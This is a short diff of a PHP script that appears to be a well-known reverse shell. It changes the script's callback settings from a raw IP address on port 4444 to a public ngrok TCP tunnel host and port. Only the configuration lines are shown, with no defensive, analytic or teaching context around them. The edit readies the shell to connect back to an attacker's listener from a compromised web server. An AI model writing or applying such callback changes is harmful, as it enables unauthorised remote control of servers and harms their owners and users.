@@ -4,8 +4,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '155.117.189.87';
-$port = 4444;
+$ip = '8.tcp.ngrok.io';
+$port = 16816;
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
